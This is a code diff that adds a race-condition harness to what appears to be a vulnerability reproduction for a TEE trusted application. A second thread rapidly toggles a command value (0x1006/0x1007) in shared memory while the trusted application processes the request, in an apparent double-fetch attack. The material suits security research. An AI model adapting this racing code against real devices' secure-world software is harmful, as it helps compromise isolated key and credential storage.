@@ -4,6 +4,16 @@
 #include "tee_client_api.h"
 #include "repro.h"
 #include <dlfcn.h>
+#include <pthread.h>
+#include <stdatomic.h>
+
+
+static pthread_cond_t cond;
+static pthread_mutex_t mutex;
+static atomic_bool stop = false;
+static bool start = false;
+#define EMULATE 1
+
 
 TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
 			     TEEC_Session*,
@@ -47,6 +57,37 @@ void cleanup_shm(){
 
 // }
 
+
+
+void * change_value(void * arg) {
+    int* comm_in_params = (int*) arg;
+    printf("waiting for signal\n");
+    pthread_mutex_lock(&mutex);
+
+    while(!start) {
+        pthread_cond_wait(&cond, &mutex);
+    }
+    pthread_mutex_unlock(&mutex);
+
+    while(!stop) {
+        comm_in_params[0] = 0x1006;
+        // TODO: maybe sleep for a while and try to extend the race window
+        printf("changed value from 0x1006 to 0x1007\n");
+        comm_in_params[0] = 0x1007;
+        printf("changed value from 0x1007 to 0x1006\n");
+    }
+    return NULL;
+}
+
+pthread_t create_thread_for_racing(void* mem_area1) {
+    pthread_t tid;
+    if (pthread_create(&tid, NULL, change_value, mem_area1) != 0) {
+        perror("pthread_create failed");
+        return NULL;
+    } 
+    return tid;
+}
+
 void send_req(TEEC_Context *context, TEEC_Session *session)
 {
 
@@ -56,6 +97,12 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
     memset(mem_area1, 0, 0x1000);
 
     // init(context, session, mem_area1);
+
+    pthread_cond_init(&cond, NULL);
+    pthread_mutex_init(&mutex, NULL);
+
+
+    pthread_t tid = create_thread_for_racing(mem_area1);
 
 	int* ints = (int*) mem_area1;
 	char* chars = (char*)mem_area1;
@@ -72,8 +119,15 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
     op.params[0].tmpref.size = 0x1000;  // the keyblock buffer
     uint32_t err_origin;
 
+    pthread_mutex_lock(&mutex);
+    start = true;
+    pthread_cond_signal(&cond);
+    pthread_mutex_unlock(&mutex);
+
     TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1, &op, &err_origin);
 	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
+    atomic_store(&stop, true);
+    pthread_join(tid, NULL);
 
 #else
 
